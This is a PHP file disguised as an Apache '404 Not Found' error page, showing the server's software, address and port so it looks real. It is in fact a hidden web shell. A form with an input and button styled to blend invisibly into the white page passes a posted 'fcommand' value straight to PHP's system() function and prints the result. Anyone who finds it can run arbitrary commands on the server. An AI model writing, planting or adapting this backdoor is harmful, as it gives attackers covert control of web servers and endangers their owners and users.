<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<?php echo "The requested URL " . $_SERVER['PHP_SELF'] ;echo"  ";echo "was not found on this server."; ?>
<hr>
<address><?php echo"" . $_SERVER['SERVER_SOFTWARE'];echo"  ";echo"Server at";echo "  " . $_SERVER['SERVER_ADDR'];echo " Port  " . $_SERVER['SERVER_PORT']; ?></address>
<style>
                input { margin:0;background-color:#fff;border:1px solid #fff; }
        </style>
        <center>
        <form method="post" action="<?php $_SERVER['PHP_SELF']; ?>">
        <input type="text" name="fcommand">
        </center>
        <button align="right" name="Enter" type="submit" color="white"></button>
        </form>
<?php 
if(isset($_POST['Enter'])) {
    if(!empty($_POST['fcommand'])) {
        $command = $_POST['fcommand'];
        $result =  system($command);
        }
    }
echo "" . $result;
?>
</html>
